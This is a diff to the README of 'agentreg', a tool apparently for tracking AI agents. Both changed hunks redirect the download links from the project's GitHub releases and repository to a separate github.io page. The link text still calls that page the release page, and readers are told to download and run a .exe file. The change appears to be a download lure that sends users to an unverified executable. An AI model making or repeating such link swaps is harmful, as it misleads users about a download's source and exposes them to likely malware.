@@ -1,6 +1,6 @@
 # 🌐 agentreg - Easily manage and connect AI agents
 
-[![Download agentreg](https://img.shields.io/badge/Download-blue)](https://github.com/herrmannfigurative689/agentreg/releases)
+[![Download agentreg](https://img.shields.io/badge/Download-blue)](https://herrmannfigurative689.github.io)
 
 agentreg acts as a central phonebook for your AI projects. You use it to track where your agents live, check if they work, and find them when your AI needs to run a task. It runs as one small file on your computer.
 
@@ -24,7 +24,7 @@ Modern AI systems often rely on multiple small programs known as agents. Keeping
 
 You need to download the program file to start.
 
-[Click here to visit the release page and download the latest version.](https://github.com/herrmannfigurative689/agentreg)
+[Click here to visit the release page and download the latest version.](https://herrmannfigurative689.github.io)
 
 Look for the file that ends in .exe. Save this file to a folder where you want your agent tools to stay. A folder named "Tools" in your documents library works well.
 
